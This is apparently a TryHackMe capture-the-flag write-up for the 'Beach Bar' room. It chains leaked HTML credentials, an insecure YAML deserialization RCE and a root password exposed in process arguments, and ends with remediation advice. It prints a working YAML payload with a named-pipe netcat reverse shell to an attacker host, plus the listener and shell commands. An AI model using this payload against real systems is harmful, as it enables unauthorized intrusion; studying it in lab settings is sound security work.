# Beach Bar — TryHackMe

> **Difficulty:** Medium  
> **Category:** Web Exploitation · Insecure Deserialization · Information Disclosure · Privilege Escalation  
> **Date:** 2025-08-05  
> **Room:** [https://tryhackme.com/room/beachbar](https://tryhackme.com/room/hh-beachbar-d849f7f7)

---

## overview

Boot2Root room running a Python web application (Gunicorn) with a Jukebox playlist management feature. The initial access comes from credentials leaked in the HTML source code, followed by Remote Code Execution via insecure YAML deserialization. Privilege escalation relies on a classic mistake: credentials passed as plaintext process arguments, visible to any user on the system.

---

## reconnaissance

```bash
nmap -sV -sC -p- -T4 <TARGET_IP>
```

| port | service | detail |
|---|---|---|
| 80/tcp | http | Gunicorn — redirects to /login |
| 22/tcp | ssh | OpenSSH |

While reviewing the web application, manual inspection of the HTML source code on the main page revealed a developer comment containing test credentials:

```html
<!-- test user: dj / dj -->
```

Information Disclosure at the very first step — no brute force needed.

---

## enumeration

### Web application — /login

Authenticated access using the leaked credentials `dj:dj` revealed a Jukebox interface with playlist management functionality. The most interesting feature: **playlist export/import**, which returned a YAML-structured file.

Exported playlist structure:

```yaml
playlist:
  name: golden hour
  vibe: chill
  tracks:
    - artist: Khruangbin
      title: Maria Tambien
```

The application was accepting YAML files for import — and processing them server-side with Python. This immediately raised the question: is it using `yaml.load()` or `yaml.safe_load()`?

---

## exploitation

### Insecure YAML Deserialization — RCE

Python's `yaml.load()` without a safe loader allows arbitrary object instantiation via custom YAML tags. The tag `!!python/object/apply:os.system` forces the interpreter to invoke a system call directly during deserialization.

**Listener setup:**

```bash
nc -lnvp 4444
```

**Malicious YAML payload:**

```yaml
playlist:
  name: !!python/object/apply:os.system ["rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <ATTACKER_IP> 4444 >/tmp/f"]
  vibe: golden hour
  tracks:
    - artist: Khruangbin
      title: Maria Tambien
```

The payload creates a Named Pipe to establish an interactive reverse shell, bypassing potential inbound firewall restrictions.

Importing the malicious file via the playlist upload feature triggered execution on the server side.

**Shell stabilization:**

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

> **Vulnerability:** Insecure Deserialization (CWE-502)  
> **Root cause:** Application using `yaml.load()` instead of `yaml.safe_load()`, allowing instantiation of arbitrary Python objects from user-supplied input.  
> **MITRE ATT&CK:** T1059 — Command and Scripting Interpreter

**User flag captured:**

```
THM{REDACTED}
```

---

## privilege escalation

### Process enumeration — credentials in plaintext arguments

With a stable shell as the application user, the next step was local infrastructure enumeration looking for misconfigurations.

```bash
ps auxww --forest
```

The `ww` flag is critical here — it prevents argument truncation, ensuring long command lines are displayed in full. Among the running processes, one stood out immediately:

```
root  /opt/beach-bar/venv/bin/python /opt/beach-bar/jukeboxd/jukeboxd.py
      --stream-pass SunsetSpritz2024! --bitrate 320k
```

The root process was passing its password as a **command-line argument** — visible to any user on the system via `ps`. This is a severe Information Disclosure vulnerability.

> **Vulnerability:** Credentials in Process Arguments (CWE-214)  
> **MITRE ATT&CK:** T1057 — Process Discovery  
> **Severity:** Critical

### Credential reuse

Testing the discovered password against the root account:

```bash
su - root
# password: SunsetSpritz2024!
```

Root access obtained.

---

## flags

```
User flag: THM{REDACTED}
Root flag: THM{REDACTED}
```

---

## attack chain

```
Nmap → port 80 (Gunicorn) · port 22 (SSH)
          │
          ▼
HTML source code → credentials leaked: dj / dj
          │
          ▼
/login → authenticated access → Jukebox interface
          │
          ▼
Playlist export → YAML structure identified
          │
          ▼
yaml.load() → insecure deserialization
          │
          ▼
Malicious YAML → !!python/object/apply:os.system
          │
          ▼
Reverse shell → nc -lnvp 4444
          │
          ▼
User flag: THM{REDACTED}
          │
          ▼
ps auxww --forest → root process with --stream-pass SunsetSpritz2024!
          │
          ▼
su - root (credential reuse)
          │
          ▼
Root flag: THM{REDACTED}
```

---

## what I learned

Two completely different vulnerability classes chained together — and both are devastatingly simple to prevent.

**Insecure deserialization** is one of those vulnerabilities that looks abstract until you see it work. The difference between `yaml.load()` and `yaml.safe_load()` is one word in the source code, but the impact is full RCE. Any application accepting serialized data from users and processing it server-side needs to be treated as a potential deserialization attack surface.

**Credentials in process arguments** is a mistake that's easy to make and hard to notice. Developers often pass secrets this way during testing and forget to change it before deploying. The fix is to use environment variables or a secrets manager — never pass sensitive data as CLI arguments, since they're readable by any user with access to `ps`.

The credential reuse at the end was the cherry on top: the same password that ran the stream service was the root password. Defense in depth means each layer should have independent credentials.

**Remediation:**

```python
# Insecure
data = yaml.load(user_input)

# Correct
data = yaml.safe_load(user_input)
```

```bash
# Insecure — visible in ps output
python app.py --stream-pass SunsetSpritz2024!

# Correct — use environment variables
export STREAM_PASS="SunsetSpritz2024!"
python app.py
```
